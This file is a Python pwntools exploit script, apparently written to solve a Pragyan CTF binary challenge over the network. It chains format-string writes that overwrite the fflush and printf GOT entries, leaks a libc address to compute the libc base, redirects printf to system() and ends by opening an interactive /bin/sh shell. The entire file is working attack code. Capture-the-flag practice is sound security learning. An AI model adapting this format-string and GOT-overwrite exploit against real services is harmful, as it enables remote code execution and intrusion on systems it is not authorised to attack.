from pwn import *

libc = ELF('./libc6_2.31-0ubuntu9.1_i386.so')
context.binary = exe = ELF('./vuln_patched', checksec=False)
context.log_level = 'debug'

libc.sym['__libc_start_main_ret'] = 0x1eee5

# p = process('./vuln_patched')
p = connect('binary.challs.pragyanctf.tech', 6005)

#####################
### Jump to lin() ###
#####################
p.sendlineafter(b'your name? \n', b'AAAAAAAA')
p.recvline()
main_addr = int(p.recvline()[:-1].split(b'. is ')[1], 16)
log.success("Main address: " + hex(main_addr))
exe.address = main_addr - exe.sym['main']
log.success("Exe address: " + hex(exe.address))

p.sendlineafter(b'2.No', b'1')
p.sendlineafter(b'2.No', b'1')
p.sendlineafter(b'2.No', b'\x01')

##################################################
### Stage 1: Overwrite fflush@got to lin()+116 ###
##################################################
lin_addr_middle_hex = hex(exe.sym['lin'] + 116)
part1 = int(lin_addr_middle_hex[-4:], 16)        # Lower bytes
part2 = int(lin_addr_middle_hex[-8:-4], 16)      # Higher bytes
if part2<part1:
	part2 += 0x10000

payload = p32(exe.got['fflush'])
payload += b'PPPP'
payload += p32(exe.got['fflush']+2)
payload += b'%c'*5
payload += '%{}c%hn'.format(part1-17).encode()
payload += '%{}c%hn%87$p'.format(part2-part1).encode()
p.sendlineafter(b'But....', payload)
p.recvline()

#####################################################
### Stage 2: Leak `__libc_start_main_ret` address ###
#####################################################
__libc_start_main_ret = int(p.recvline().split(b'0x')[-1], 16)
log.success("__Libc_start_main_ret: " + hex(__libc_start_main_ret))
libc.address = __libc_start_main_ret - libc.sym['__libc_start_main_ret']
log.success("Libc base: " + hex(libc.address))
print(hex(exe.got['fflush']))
print(hex(exe.sym['lin'] + 116))

#################################################
### Stage 3: Overwrite printf@got to system() ###
#################################################
system_addr_hex = hex(libc.sym['system'])
part1 = int(system_addr_hex[-4:], 16)
part2 = int(system_addr_hex[-8:-4], 16)
if part2<part1:
    part2 += 0x10000

payload = p32(exe.got['printf'])
payload += b'PPPP'
payload += p32(exe.got['printf']+2)
payload += b'%c'*10
payload += '%{}c%hn'.format(part1-22).encode()
payload += '%{}c%hn'.format(part2-part1).encode()
p.sendline(payload)
p.recvline()

p.sendline(b'/bin/sh')

p.interactive()
